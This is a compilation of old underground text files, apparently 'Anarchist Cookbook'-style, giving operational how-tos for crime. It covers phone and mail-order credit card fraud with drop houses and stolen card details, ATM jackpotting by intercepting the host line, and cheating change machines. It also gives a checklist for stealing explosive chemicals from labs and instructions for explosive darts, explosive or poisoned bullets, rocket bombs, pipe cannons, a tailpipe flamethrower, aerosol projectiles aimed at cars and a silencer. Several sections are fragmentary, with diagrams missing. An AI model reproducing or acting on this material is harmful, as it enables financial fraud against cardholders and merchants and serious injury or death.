Carder:   "6732 Goatsgate Port.  Paris,texas,010166."
Operator: "And what is your home telephone number?"
Carder:   "212-724-9970" (This number is actually always busy)
Operator: "I will also need your business phone number in case we have
to reach you."
Carder:   "You can reach me at the same number. 212-724-9970"
Operator: "O.K. Thank you very much and have nice day."
Carder:   "Excuse me, when will the package arrive?"
Operator: "In six to seven days UPS."
Carder:   "Thanks alot, and have a pleasant day."
Now you wait 6-7 days when the package will arrive to the address which
is really a house up for sale.  There will be a note on the door
saying, "Hello UPS, please leave all packages for Lenny Lipshitz in the
lobby or porch.  Thanks alot, Lenny Lipshitz" (Make the signature half-way
convincing)

Still as DANGEROUS as ever.............   RFLAGGRecognizing credit cards                        by the Jolly Roger

  [Sample: American Express]
      XXXX XXXXXX XXXXX
      MM/Y1 THRU MM/Y2       Y1
      John Doe               AX

Explanation:
The first date is the date the person got the card, the second
date is the expriation date, after the expiration date is the same
digits in the first year.The American Express Gold has many more
numbers (I think 6 8 then 8). If you do find a Gold card keep it
for it has a $5000.00 backup even when the guy has no money!

[Sample: Master Card]
   5XXX XXXX XXXX XXXX
   XXXX AAA DD-MM-YY MM/YY
   John Doe.

Explanation:
The format varies, I have never seen a card that did not start with
a 5XXX there is another 4 digits on the next line that is sometimes
asked for when ordering stuff, (and rarely a 3 digit letter combo
(e. ANB). The first date is the date the person got the card
and the second date is the expiration date.
Master Card is almost always accepted at stores.
[Sample: VISA]
   XXXX XXX(X) XXX(X) XXX(X)
   MM/YY    MM/YY*VISA
   John Doe

Explanation:
Visa is the most straight forward
of the cards,for it has the name right on the card itself, again the
first date is the date he got the card and the second is the
expiration date. (Sometimes the first date is left out). The
numbers can eather be 4 3 3 3 or 4 4 4 4. Visa is also almost always
accepted at stores, therefore, the best of cards to use.

Jackpotting ATM Machines                courtesy of the Jolly Roger

JACKPOTTING was done rather successfully a while back in (you guessed it)
New York. What the culprits did was:
Sever (actually cross over) the line between the ATM and the
host. insert a microcomputer between the ATM and the host. insert
a fradulent card into the ATM.  (card=cash card, not hardware)
What the ATM did was: send a signal to the host, saying "Hey!  Can I
give this guy money, or is he broke, or is his card invalid?"
What the microcomputer did was: intercept the signal from the host,
discard it, send "there's no one using the ATM" signal.
What the host did was: get the "no one using" signal, send back "okay,
then for God's sake don't spit out any money!" signal to ATM.
What the microcomputer did was:
intercept signal (again), throw it away (again), send "Wow!  That
guy is like TOO rich!  Give him as much money as he wants.  In
fact, he's so loaded, give him ALL the cash we have!  He is
really a valued customer." signal.
What the ATM did:
what else?  Obediently dispense cash till the cows came home (or
very nearly so).
What the crooks got:
well in excess of $120,000 (for one weekend's work), and several
years when they were caught.
This story was used at a CRYPTOGRAPHY conference I attended a while
ago to demonstrate the need for better information security.  The
lines between ATM's & their hosts are usually 'weak' in the sense that
the information transmitted on them is generally not encrypted in any
way.  One of the ways that JACKPOTTING can be defeated is to encrypt
the information passing between the ATM and the host.  As long as the
key cannot be determined from the ciphertext, the transmission (and
hence the transaction) is secure.
A more believable, technically accurate story might concern a person
who uses a computer between the ATM and the host to determine the key
before actually fooling the host.  As everyone knows, people find
cryptanalysis a very exciting and engrossing subject...don't they?
(Hee-Hee)

_____             ______
|   |-<<-|   |-<<-|    |
|ATM|    micro    |Host|
|___|->>-|   |->>-|____|

The B of A ATM's are connected through dedicated lines to a host
computer as the Bishop said. However, for maintenance purposes, there
is at least one separate dial-up line also going to that same host
computer. This guy basically bs'ed his way over the phone till he
found someone stupid enough to give him th number. After finding that,
he had has Apple hack at the code. Simple.
Step 2: He had a friend go to an ATM with any B of A ATM card. He
stayed at home with the Apple connected to the host. When his friend
inserted the card, the host displayed it. The guy with the Apple
modified the status & number of the card directly in the host's
memory. He turned the card into a security card, used for testing
purposes. At that point, the ATM did whatever it's operator told it to
do.
The next day, he went into the bank with the $2000 he received,
talked to the manager and told him every detail of what he'd done. The
manager gave him his business card and told him that he had a job
waiting for him when he got out of school.
Now, B of A has been warned, they might have changed the system. On
the other hand, it'd be awful expensive to do that over the whole
country when only a handful of people have the resources and even less
have the intelligence to duplicate the feat. Who knows?

Ripping off Change Machines                     by the Jolly Roger

Have you ever seen one of those really big changer machines in airports
laundrymats or arcades that dispense change when you put in your 1 or 5
dollar bill?  Well then, here is an article for you.

1)  Find the type of change machine that you slide in your bill length
wise, not the type where you put the bill in a tray and then slide the 
tray in!!!
2)  After finding the right machine, get a $1 or $5 bill.  Start crumpling
up into a ball.  Then smooth out the bill, now it should have a very wrinkly
surface.
3) Now the hard part.  You must tear a notch in the bill on the
left side about 1/2 inch below the little 1 dollar symbol (See Figure).
4) If you have done all of this right then take the bill and go out the
machine.  Put the bill in the machine and wait.  What should happen is:
when you put your bill in the machine it thinks everything is fine. 
When it gets to the part of the bill with the notch cut out, the
machine will reject the bill and (if you have done it right)
give you the change at the same time!!! So, you end up getting your bill
back, plus the change!!  It might take a little practice, but once
you get the hang of it, you can get a lot of money!

This is another good way to                     Compiled by:
rip off a change or drink machine....                   -= Exodus =-
 

You first get a nice new dollar to work with.  Make sure there are no
rips in it.  Now, you get a thin piece of transparent plastic about
3/4 the width of the actual dollar.  It must be a good 6" or longer.
Next, you need some transparant tape.  Scotch magic tape will work
the best.  You simply tape the plastic strip to the dollar.  But, you
must be careful not to tape it more than 1/2" up the side of the dollar.
tape it on both sides (front and back, not top and bottom) of the dollar.
Now, all you have to do is use it:

Walk casually up to the secluded machine.  Take out your dollar, and put
it into the machine.  BE CAREFUL! Some of the more modern change machines
have alarms!  Most likely, though, drink or candy machines will not.  Now,
the machine starts taking your dollar.... You wait until your plastic
strip is almost all the way into the machine, and then you pull with
sufficient force to get the dollar out of the machine, but not rip it.  If
You did it correctly, you should have gotten whatever you bought, and still
have your dollar for later use.  On candy machines, though, make your
selection, and then wait and pull the dollar out.  Don't worry if you don't
get it on the first few tries.  It took me about 5 tries to master it.  It
DOES, i repeat DOES work for a fact if done correctly.  If you just can't
get it, though, either the machine is too sophisticated, or you put the
tape up too high on the dollar.  Have fun!!!!

U.K. CREDIT CARD FRAUD - 22/10/90 - Written by CREDITMAN

U.K. credit card fraud is a lot  easier  than over in the States.  The
same basic 3 essentials are needed -

          1...A safehouse.
          2...Credit card numbers with Xp date and address.
          3...Good suppliers of next day delivery goods.

1...The Safehouse
The safehouse should be on the ground floor, so as not to piss off
the delivery man when he comes  to  drop off your freshly stolen gear.
If he has to go up 10 flights in  a complete dive and some 14 year old
kid signs for an A2000 then he's gonna wonder!  Make sure there are no
nosey neighbours, a good area is one  full of yuppies 'cos they all go
to work during daytime.  Safehouses  are  usually obtained by paying a
month's rent in  advance  or  putting  down  a  deposit  of say, 200.
Either that or break into a place and use that.

2...Credit Card Numbers.
The card number, expiry  date,  start  date  (if  possible), full name
(including middle inital), phone number and full address with postcode
are ideal.  If you can  only  get  the  sirname,  and no postcode, you
shouldn't have any real hassle.  Just  say  you moved recently to your
new address.  Phone number is handy, if it just rings and rings but if
it doesn't, then make  sure  it's  ex-directory.   You CANNOT get away
with giving them a bullshit  phone  number.  Some fussy companies want
phone numbers just to cross-check  on  CARDNET  but generally it's not
needed.  To recap, here's a quick check-list...


             1.Card number and Xpiry date.
             2.Name and address of card holder.
             3.First name/initials (OPTIONAL)
             4.Start date (OPTIONAL)
             5.Postcode (OPTIONAL)
             6.Phone number (OPTIONAL)

If you have all 6, then you  shouldn't have any hassle.  Start date is
the rarest item you could  be  asked  for,  postcode and initals being
more common.  If you are missing 3-6 then you need one helluva smooth-
talking bastard on the phone line!!!!

3...The Ordering
Not everyone can order 1000's of stuff  - it's not easy.  You have to
be cool, smooth and  have  some  good  answers  to their questions.  I
advise that you only order up to 500 worth of stuff in one go, but if
you have details 1-6 and the phone number will NOT be answered from 9-
5.30 P.M. then go up to  1000  (make  sure  it's a GOLD card!).  When
getting ready to order make sure you  have at least 3 times the amount
of suppliers you need e.g.if you want to card 5 hard-drives, make sure
you have 15 suppliers.  A lot of  the time, they are either out stock,
can't do next day delivery or won't deliver to a different address.
Quick check list of what you must ask before handing over number -

       1.Next day delivery, OK?
       2.Ordered to different address to card, OK?
       3.Do you have item in stock (pretty obvious, eh?)

Make sure you ask  ALL  of  these  questions  before handing over your
precious number.

Excuses...
Usual excuses for a  different  address  are  that  it's  a present or
you're on business here for the  next  5  weeks etc.  Any old bullshit
why it won't go to the proper address.

WARNING!*******Invoices!*******WARNING!
Invoices are sometimes sent out  with  the  actual parcel but they are
also sent out to the  card  owners  (why  do  you  think they need the
address for?) so using a safehouse for more than 2 days is risky.  A 1
day shot is safe, if they catch  on then they'll stop the goods before
getting a search warrant.

Credit Limits...
Limits on cards reach from 500 to  4000 on Gold cards.  Your average
card will be about 1000-1500.  It takes  a  while to build up a good
credit rating in order to have large  limits so don't think every card
will hold 12 IBM 386's!  Visa  and  Access  are always used - American
Xpress etc. are USELESS.

         Access = Eurocard, Mastercard (begins with 5)
         Visa = (begins with 4, 16 digit is a Gold)

A general rule is, always  confirm  an  order  to  make sure credit is
cleared.  As the month goes on, credit is  used up - the bad times are
from 27th - 3rd which is  when  all  the  bills come in.  Best time to
card is around 11th or 12th, when  the  poor guy has paid off his last
bill so you can run up a new one (he, he, he!).

Ideal items to card...

The best stuff is always computer hard-ware as it's next-day.  Amigas,
ST's, PC's -  anything  really.   Blank  discs  are  a  waste of time,
they're too heavy.  Xternal drives,  monitors  - good stuff basically.
Don't  order  any  shit   like   VCR's,  hi-fi,  video-cameras,  music
keyboards, computer software, jewerely or anything under 300.  You'll
find the listed items  are  difficult  to  get  next  day delivery and
usually won't deliver to a  different  address - bastards, eh?  You're
wasting your time with little items under 300, try to keep deliveries
under 10 a day.

The drop....
Two ways of doing the drop

     1.Sign for all the gear (make  sure you're there between 9.00 and
5.30 P.M.)

     2.Don't turn up till around 6.30  P.M.  and collect all the cards
that the delivery man has left.  These usually say 'you were out at XX
time so could you please  arrange  new  time  for  delivery or pick up
from our depot'.  In that case, piss off  to the depot and get all the
gear (need a big car!).

Remember, carding is ILLEGAL  kiddies,  so  don't  do it unless you're
going to cut me on it!!!!


CHECKLIST FOR RAIDS ON LABS                              by: Exodus

     In the end, the serious terrorist would probably realize that if he/she
wishes to make a truly useful explosive, he or she will have to steal the
chemicals to make the explosive from a lab.  A list of such chemicals in order
of priority would probably resemble the following:

     LIQUIDS                    SOLIDS
     _______                    ______

     ____     Nitric Acid        ____    Potassium Perchlorate
     ____     Sulfuric Acid      ____    Potassium Chlorate
     ____     95% Ethanol        ____    Picric Acid (usually a powder)
     ____     Toluene            ____    Ammonium Nitrate

SPECIAL AMMUNITION FOR BLOWGUNS

     The blowgun is an interesting weapon which has several advantages. A
blowgun can be extremely accurate, concealable, and deliver an explosive or
poisoned projectile.  The manufacture of an explosive dart or projectile is
not difficult. To acquire a blowgun, please contact the editor at one of the
addresses given in the introduction.

  Perhaps the most simple design for such involves the use of a pill capsule,
such as the kind that are taken for headaches or allergies. Empty gelatin pill
capsules can be purchased from most health-food stores.  Next, the capsule
would be filled with an impact-sensitive explosive, such as mercury fulminate.
An additional high explosive charge could be placed behind the impact
sensitive explosive, if one of the larger capsules were used.

   Finally, the explosive capsule would be reglued back together, and a tassel
or cotton would be glued to the end containing the high explosive, to insure
that the impact-detonating explosive struck the target first.

 Such a device would probably be about 3/4 of an inch long, not including the
tassel or cotton, and look something like this:


                 ____________________
                /mercury |           \-----------------------              
               (fulminate|   R.D.X.   )---------------------- } tassels
                \________|___________/-----------------------


    Care must be taken- if a powerful dart went off in the blowgun, you could
easily blow the back of your head off.


 SPECIAL AMMUNITION FOR WRISTROCKETS AND SLINGSHOTS

     A modern wristrocket is a formidable weapon.  It can throw a shooter marble
about 500 ft. with reasonable accuracy.  Inside of 200 ft., it could well be
lethal to a man or animal, if it struck in a vital area.  Because of the
relatively large sized projectile that can be used in a wristrocket, the
wristrocket can be adapted to throw relatively powerful explosive projectiles.

   A small segment of aluminum pipe could be made into an impact-detonating
device by filling it with an impact-sensitive explosive material.

   Also, such a pipe could be filled with a low-order explosive, and fitted
with a fuse, which would be lit before the device was shot.  One would have to
make sure that the fuse was of sufficient length to insure that the device did
not explode before it reached its intended target.

   Finally, .22 caliber caps, such as the kind that are used in .22 caliber
blank guns, make excellent exploding ammunition for wristrockets, but they
must be used at a relatively close range, because of their light weight.


SPECIAL AMMUNITION FOR FIREARMS

     When special ammunition is used in combination with the power and
rapidity of modern firearms, it becomes very easy to take on a small army with
a single weapon. It is possible to buy explosive ammunition, but that can be
difficult to do. Such ammunition can also be manufactured in the home.  There
is, however, a risk involved with modifying any ammunition.  If the ammunition
is modified incorrectly, in such a way that it makes the bullet even the
slightest bit wider, an explosion in the barrel of the weapon will occur.  For
this reason, NOBODY SHOULD EVER ATTEMPT TO MANUFACTURE SUCH AMMUNITION.


SPECIAL AMMUNITION FOR HANDGUNS

     If an individual wished to produce explosive ammunition for his/her
handgun, he/she could do it, provided that the person had an impact-sensitive
explosive and a few simple tools.  One would first purchase all lead bullets,
and then make or acquire an impact-detonating explosive.  By drilling a hole
in a lead bullet with a drill, a space could be created for the placement of
an explosive.  After filling the hole with an explosive, it would be sealed in
the bullet with a drop of hot wax from a candle.  A diagram of a completed
exploding bullet is shown below.


                      _o_ ------------ drop of wax
                     /|*|\
                    | |*|-|----------- impact-sensitive explosive                
                    | |_| |
                    |_____|

     This hollow space design also works for putting poison in bullets.

      In many spy thrillers, an assassin is depicted as manufacturing
"exploding bullets" by placing a drop of mercury in the nose of a bullet.
Through experimentation it has been found that this will not work. Mercury
reacts with lead to form a inert silvery compound.


SPECIAL AMMUNITION FOR SHOTGUNS

     Because of their large bore and high power, it is possible to create some
extremely powerful special ammunition for use in shotguns. If a shotgun shell
is opened at the top, and the shot removed, the shell can be re-closed. Then,
if one can find a very smooth, lightweight wooden dowel that is close to the
bore width of the shotgun, a person can make several types of shotgun-launched
weapons.

   Insert the dowel in the barrel of the shotgun with the shell without the
shot in the firing chamber. Mark the dowel about six inches away from the end
of the barrel, and remove it from the barrel.

   Next, decide what type of explosive or incendiary device is to be used.
This device can be a chemical fire bottle (sect. 3.43), a pipe bomb (sect
4.42), or a thermite bomb (sect 3.41 and 4.42). After the device is made, it
must be securely attached to the dowel. When this is done, place the dowel
back in the shotgun. The bomb or incendiary device should be on the end of the
dowel.

   Make sure that the device has a long enough fuse, light the fuse, and fire
the shotgun. If the projectile is not too heavy, ranges of up to 300 ft are
possible. A diagram of a shotgun projectile is shown below:

ammunition may cause the device to land perilously close to the user.


SPECIAL AMMUNITION FOR COMPRESSED AIR/GAS WEAPONS

     This section deals with the manufacture of special ammunition for
compressed air or compressed gas weapons, such as pump B.B guns, CO2 B.B guns,
and .22 cal pellet guns.  These weapons, although usually thought of as kids
toys, can be made into rather dangerous weapons.


SPECIAL AMMUNITION FOR B.B GUNS

     A B.B gun, for this manuscript, will be considered any type of rifle or
pistol that uses compressed air or CO2 gas to fire a projectile with a caliber
of .177, either B.B, or lead pellet. Such guns can have almost as high a
muzzle velocity as a bullet-firing rifle. Because of the speed at which a .177
caliber projectile flies, an impact detonating projectile can easily be made
that has a caliber of .177.

     Most ammunition for guns of greater than .22 caliber use primers to
ignite the powder in the bullet. These primers can be bought at gun stores,
since many people like to reload their own bullets. Such primers detonate when
struck by the firing pin of a gun. They will also detonate if they are thrown
at a hard surface at a great speed.

 Usually, they will also fit in the barrel of a .177 caliber gun. If they are
inserted flat end first, they will detonate when the gun is fired at a hard
surface. If such a primer is attached to a piece of thin metal tubing, such as
that used in an antenna, the tube can be filled with an explosive, be sealed,
and fired from a B.B gun. A diagram of such a projectile appears below:

                    |_______ antenna tubing

     The front primer is attached to the tubing with a drop of super glue. The
tubing is then filled with an explosive, and the rear primer is glued on.
Finally, a tassel, or a small piece of cotton is glued to the rear primer, to
insure that the projectile strikes on the front primer.  The entire projectile
should be about 3/4 of an inch long.



SPECIAL AMMUNITION FOR .22 CALIBER PELLET GUNS

     A .22 caliber pellet gun usually is equivalent to a .22 cal rifle, at
close ranges.  Because of this, relatively large explosive projectiles can be
adapted for use with .22 caliber air rifles.  A design similar to that used in
section 5.12 is suitable, since some capsules are about .22 caliber or
smaller. Or, a design similar to that in section 5.31 could be used, only one
would have to purchase black powder percussion caps, instead of ammunition
primers, since there are percussion caps that are about .22 caliber.  A #11
cap is too small, but anything larger will do nicely.

ROCKETS AND CANNONS

     Rockets and cannon are generally thought of as heavy artillery.
Perpetrators of violence do not usually employ such devices, because they are
difficult or impossible to acquire.  They are not, however, impossible to
make. Any individual who can make or buy black powder or pyrodex can make such
things. A terrorist with a cannon or large rocket is, indeed, something to
fear.


ROCKETS

     Rockets were first developed by the Chinese several hundred years before
the myth of christ began.  They were used for entertainment, in the form of
fireworks. They were not usually used for military purposes because they were
inaccurate, expensive, and unpredictable.  In modern times, however, rockets
are used constantly by the military, since they are cheap, reliable, and have
no recoil. Perpetrators of violence, fortunately, cannot obtain military
rockets, but they can make or buy rocket engines.  Model rocketry is a popular
hobby of the space age, and to launch a rocket, an engine is required.  Estes,
a subsidiary of Damon, is the leading manufacturer of model rockets and rocket
engines.  Their most powerful engine, the "D" engine, can develop almost 12
lbs. of thrust; enough to send a relatively large explosive charge a
significant distance. Other companies, such as Centuri, produce even larger
rocket engines, which develop up to 30 lbs. of thrust.  These model rocket
engines are quite reliable, and are designed to be fired electrically.  Most
model rocket engines have three basic sections.  The diagram below will help
explain them.

     The clay nozzle is where the igniter is inserted.  When the area labeled
"thrust" is ignited, the "thrust" material, usually a large single grain of a
propellant such as black powder or pyrodex, burns, forcing large volumes of
hot, rapidly expanding gasses out the narrow nozzle, pushing the rocket
forward.

     After the material has been consumed, the smoke section of the engine is
ignited.  It is usually a slow-burning material, similar to black powder that
has had various compounds added to it to produce visible smoke, usually black,
white, or yellow in color.  This section exists so that the rocket will be
seen when it reaches its maximum altitude, or apogee.

     When it is burned up, it ignites the ejection charge, labeled "eject".
The ejection charge is finely powdered black powder.  It burns very rapidly,
exploding, in effect.  The explosion of the ejection charge pushes out the
parachute of the model rocket. It could also be used to ignite the fuse of a
bomb...

     Rocket engines have their own peculiar labeling system.  Typical engine
labels are: 1/4A-2T, 1/2A-3T, A8-3, B6-4, C6-7, and D12-5.  The letter is an
indicator of the power of an engine.  "B" engines are twice as powerful as "A"
engines, and "C" engines are twice as powerful as "B" engines, and so on.  The
number following the letter is the approximate thrust of the engine, in
pounds. the final number and letter is the time delay, from the time that the
thrust period of engine burn ends until the ejection charge fires; "3T"
indicates a 3 second delay.

NOTE: an extremely effective rocket propellant can be made by mixing aluminum
      dust with ammonium perchlorate and a very small amount of iron oxide.
      The mixture is bound together by an epoxy.


BASIC ROCKET BOMB

     A rocket bomb is simply what the name implies: a bomb that is delivered
to its target by means of a rocket.  Most people who would make such a device
would use a model rocket engine to power the device.  By cutting fins from
balsa wood and gluing them to a large rocket engine, such as the Estes "C"
engine, a basic rocket could be constructed.  Then, by attaching a "crater
maker", or CO2 cartridge bomb to the rocket, a bomb would be added.  To insure
that the fuse of the "crater maker" (see sect. 4.42) ignited, the clay over
the ejection charge of the engine should be scraped off with a plastic tool.
The fuse of the bomb should be touching the ejection charge, as shown below.

     Duct tape is the best way to attach the crater maker to the rocket
engine. Note in the diagram the absence of the clay over the ejection charge
Many different types of explosive payloads can be attached to the rocket, such
as a high explosive, an incendiary device, or a chemical fire bottle.

   Either four or three fins must be glued to the rocket engine to insure that
the rocket flies straight. The fins should look like the following diagram:

          |       |
           \_____/


     The leading edge and trailing edge should be sanded with sandpaper so
that they are rounded.  This will help make the rocket fly straight.  A two
inch long section of a plastic straw can be attached to the rocket to launch
it from.  A clothes hanger can be cut and made into a launch rod.  The segment
of a plastic straw should be glued to the rocket engine adjacent to one of the
fins of the rocket.  A front view of a completed rocket bomb is shown below.

                              |

     By cutting a coat hanger at the indicated arrows, and bending it, a
launch rod can be made.  After a fuse is inserted in the engine, the rocket is
simply slid down the launch rod, which is put through the segment of plastic
straw. The rocket should slide easily along a coathanger, such as the one
illustated on the following page:

LONG RANGE ROCKET BOMB

     Long range rockets can be made by using multi-stage rockets.  Model
rocket engines with an "0" for a time delay are designed for use in
multi-stage rockets.  An engine such as the D12-0 is an excellent example of
such an engine. Immediately after the thrust period is over, the ejection
charge explodes.  If another engine is placed directly against the back of an
"0" engine, the explosion of the ejection charge will send hot gasses and
burning particles into the nozzle of the engine above it, and ignite the
thrust section.  This will push the used "0" engine off of the rocket, causing
an overall loss of weight.

 The main advantage of a multi-stage rocket is that it loses weight as
travels, and it gains velocity.  A multi-stage rocket must be designed
somewhat differently than a single stage rocket, since, in order for a rocket
to fly straight, its center of gravity must be ahead of its center of drag.
This is accomplished by adding weight to the front of the rocket, or by moving
the center of drag back by putting fins on the rocket that are well behind the
rocket.  A diagram of a multi-stage rocket appears on the following page:

     Two, three, or even four stages can be added to a rocket bomb to give it

fin area gets larger.

Blowgun                                         by The Jolly Roger

In this article I shall attempt to explain the use and manufacture
of a powerfull blow-gun and making darts for the gun.The possesion of
the blow gun described in this article IS a felony.
So be carefull where you use it. I don't want to get you all busted.

Needed:

1. Several strands of yarn (About 2 inches a-piece)
2. A regular pencil
3. A 2 1/4 inch long needle (hopefully with a beaded head. If not
   obtainable,wrap tape around end of needle.
4. 2-3 1/4 foot pipe. (PVC or Aluminum) Half a inch in diameter

Constructing the dart:

1st- Carefully twist and pull the metal part (Along with eraser)
of the pencil till it comes off.
2nd- Take Pin and start putting about 5-7 Strands of yarn on the pin. Then
push them up to the top of the pin. But not over the head of the pin (orthe tape).
3rd- Push pin through the hollow part of the head where the pencil was before.
4th- That should for a nice looking dart. (see illustration)

               -  is the pin it-self
               /  is the head of the pin

Using the Darts:
  
1st- Now take the finished dart and insert it in the tube
(if it is too small put on more yarn.)
2nd- Aim the tube at a door, wall, sister, ect.
3rd- blow on the end of the pipe.
4th- Sometimes the end of the pipe may be sharp. When this happens I
suggest you wrap it with some black electrician tape.It should feel
a lot better.

Home-brew blast cannon                          by The Jolly Roger

Materials needed:

 -1 plastic drain pipe, 3 feet long, at least 3 1/2 inches in 
  diameter
 -1 smaller plastic pipe, about 6 inches long, 2 inches in 
  diameter
 -1 large lighter, with fluid refills (this gobbles it up!)
 -1 pipe cap to fit the large pipe, 1 pipe cap to fit the small 
  pipe
 -5 feet of bellwire
 -1 SPST rocker switch
 -16v polaroid pot-a-pulse battery
 -15v relay (get this at Radio Shack)
 -Electrical Tape
 -One free afternoon

Procedure:

 - Cut the bell wire into three equal pieces, and strip the ends

 - Cut a hole in the side of the large pipe, the same diameter as 
the small pipe. Thread the hole and one end of the small pipe. 
they should screw together easily.

 - Take a piece of scrap metal, and bend it into an "L" shape, 
then attach it to the level on the lighter:

 /------------------------gas switch is here
 V
 /------
!lighter!!<---metal lever
!!!
!!

Now, every time you pull the 'trigger' gas should flow freely from 
the lighter. You may need to enlarge the 'gas port' on your 
lighter, if you wish to be able to fire more rapidly.

 - Connect two wires to the two posts on the switch

 - Cut two holes in the side of the smaller tube, one for the 
switch on the bottom, and one for the metal piece on the top. 
Then, mount the switch in the bottom, running the wires up and out 
of the top.

 - Mount the lighter/trigger in the top. Now the switch should 
rock easily, and the trigger should cause the lighter to pour out 
gas. Re-screw the smaller tube into the larger one, hold down the 
trigger a bit, let it go, and throw a match in there. If all goes 
well, you should hear a nice big 'THUD!'

 - Get a hold of the relay, and take off the top.

 cc-------------/

Connect (1) to one of the wires coming from the switch. Connect 
(2) to (4), and connect (5) to one side of the battery. Connect 
the remaining wire from the switch to the other side of the 
battery. Now you should be able to get the relay to make a little 
'buzzing' sound when you flip the switch and you should see some 
tiny little sparks.

 - Now, carefully mount the relay on the inside of the large pipe, 
towards the back. Screw on the smaller pipe, tape the battery to 
the side of the cannon barrel (yes, but looks aren't everything!)

 - You should now be able to let a little gas into the barrel and 
set it off by flipping the switch.

 - Put the cap on the back end of the large pipe VERY SECURELY. 
You are now ready for the first trial-run!

To Test:

Put something very, very large into the barrel, just so that it 
fits 'just right'. Now, find a strong guy (the recoil will 
probably knock you on your ass if you aren't careful!). Put on a 
shoulderpad, earmuffs, and possibly some other protective clothing 
(trust the Jolly Roger! You are going to need it!). Hold the 
trigger down for 30 seconds, hold on tight, and hit the switch. 
With luck and the proper adjustments, you should be able to put a 
frozed orange through 1/4 or plywood at 25 feet.

Have fun!                                  -RFLAGG-

BASIC PIPE CANNON                                -= Exodus =-


     A simple cannon can be made from a thick pipe by almost anyone.  The only
difficult part is finding a pipe that is extremely smooth on its interior.
This is absolutely necessary; otherwise, the projectile may jam.  Copper or
aluminum piping is usually smooth enough, but it must also be extremely thick
to withstand the pressure developed by the expanding hot gasses in a cannon.

  If one uses a projectile such as a CO2 cartridge, since such a projectile
can be made to explode, a pipe that is about 1.5 - 2 feet long is ideal.  Such
a pipe MUST have walls that are at least 1/3 to 1/2 an inch thick, and be very
smooth on the interior.  If possible, screw an endplug into the pipe.
Otherwise, the pipe must be crimped and folded closed, without cracking or
tearing the pipe. A small hole is drilled in the back of the pipe near the
crimp or endplug. Then, all that need be done is fill the pipe with about two
teaspoons of grade blackpowder or pyrodex, insert a fuse, pack it lightly by
ramming a wad of tissue paper down the barrel, and drop in a CO2 cartridge.
Brace the cannon securely against a strong structure, light the fuse, and run.
If the person is lucky, he will not have overcharged the cannon, and he will
not be hit by pieces of exploding barrel.  Such a cannon would look like this:

      |_|______________________________________________________________|

     An exploding projectile can be made for this type of cannon with a CO2
cartridge. It is relatively simple to do. Just make a crater maker, and
construct it such that the fuse projects about an inch from the end of the
cartridge. Then, wrap the fuse with duct tape, covering it entirely, except
for a small amount at the end. Put this in the pipe cannon without using a
tissue paper packing wad.

ROCKET FIRING CANNON


           ___          A rocket firing cannon can be made exactly like a
          /   \    normal cannon; the only difference is the ammunition. A
          |   |    rocket fired from a cannon will fly further than a rocket
          | C |    alone, since the action of shooting it overcomes the
          | M |    initial inertia. A rocket that is launched when it is
          |   |    moving will go further than one that is launched when it
          |   |    is stationary. Such a rocket would resemble a normal
          |___|    rocket bomb, except it would have no fins. It would look
          | E |    like the image to the left.
          | N |
          | G |         the fuse on such a device would, obviously, be short,
          | I |    but it would not be ignited until the rocket's ejection
          | N |    charge exploded.  Thus, the delay before the ejection
          | E |    charge, in effect, becomes the delay before the bomb
          |___|    explodes. Note that no fuse need be put in the rocket; the
                   burning powder in the cannon will ignite it, and
                   simultaneously push the rocket out of the cannon at a high
                   velocity.


REINFORCED PIPE CANNON     

In high school, a friend and I built cannons and launched CO2 cartridges, etc,
etc.  However, the design of the cannon is what I want to add here.

It was made from plain steel water pipe, steel wire, and lead.

Here is a cross section:

    We dug into the side of a sand pile and built a chimney out of firebrick.
Then we stood the assembled pipe and wire on end in the chimney, sitting on
some bricks.  We then had a blowtorch heating up the chimney, so that the pipe
was red hot.  Then we poured molten lead into the space between the pipes.  If
the caps aren't screwed on real tight, some of the lead will leak out.  If
that happens, turn off the blowtorch and the pipe will cool enough and the
lead will stiffen and stop the leak.

    We used homemeade and commercial black powder, and slow smokeless shotgun
powder in this thing.  After hundreds of shots we cut it up and there was no
evidence of cracks or swelling of the inner pipe.

If you have a bow, this one is for you. Remove the ferrule from an
aluminum arrow, and fill the arrow with black powder (I use grade
FFFF, it burns easy)and then glue a shotshell primer into the hole
left where the ferrule went. Next, glue a BB on the primer, and you
are ready to go! Make sure no one is nearby.... Little shreds of
aluminum go all over the place!!

For this one, all you need is a car, a sparkplug, ignition wire and a
switch. Install the spark plug into the last four or five inches of
the tailpipeby drilling a hole that the plug can screw into easily.
Attach the wire (this is regular insulated wire) to one side of the
switch and to the spark plug. The other side of the switch is attached
to the positive terminal on the battery. With the car running, simply
hit the switch and watch the flames fly!!! Again be careful that no
one is behind you! I have seen some of these flames go 20 feet!!!

                           Down the Road' Missle



This missle is aptly named because it travels best down a street or road. This 
is nothing more that harmless phun intended to scare the living shit out of 
oncoming cars.  

How To Make A Missle
--------------------

All you need are :

-Hairspray can, or something else with flammable propellant (don't use 
spraypaint dipshit, it makes a big mess!)
 
-book of ordinary matches

-tape (clear if possible, its thinner)

-BB or pellet gun (use BB's if possible)


Instructions:
-------------

Tape the book of matches to the bottom of the can, y'know, the CONCAVE part. 
You might want to arrange the matches so that they are spread over a wide area 
of the bottom of the can, but close together.
	Shake the can up vigorously. Now place the can on its side with the 
nozzle of the can pointed in the direction you want it to go, down a road, off 
a ramp, at your sister, etc.. Now stand back a bit, and shoot at the matches.
It should take off at about 30 ft per sec!!  What happens in case you couldn't
tell, is the BB hits the matches and causes a spark, and at roughly the same
time, punctures the weak bottom of the can.  As the propellant sprays out, it
hopefully comes in contact with the spark, and presto. If you dont do it right
you'll blow a lot of money because each can can only be used once, so 
experiment to find best results.


In The Air Missle
-----------------

Compile the rocket as stated before, and put it verticle on a stand of some 
sort with the bottom accessable.  Place a section of PVC pipe 95 deg. 
preferred and shoot into the PVC pipe which should direct the BB upward, and 
the can should take off.  Experiment w/ different cans, its hard to find ones
that work perfectly, and still go higher than 30 ft.

     Low signature systems (silencers) for improvised small arms weapons 
can be made from steel gas or water pipe and fittings.

Material Required:
-----------------
Grenade Container
Steel pipe nipple, 6 in. (15 cm) long - (see table 1 for diameter)
2 steel pipe couplings - (see table 2 for dimensions)

3) Thread one of the pipe couplings on the drilled pipe nipple.
4) Cut coupling length to allow barrel of weapon to thread fully into low 
signature system. Barrel should butt against end of the drilled pipe 
nipple.
5) Seperate the top half of the grenade container from the bottom half.
6) Insert the pipe nipple in the drilled hole at the base of the bottom 
half of the container. Pack theabsorbent cotton inside the container and 
around the pipe nipple.
7) Pack the absorbent cotton in top half of grenade container leaving 
hole in center. Assemble container to the bottom half.
8) Thread the other coupling onto the pipe nipple.

Note: A longer container and pipe nipple, with same "A" and "B" 
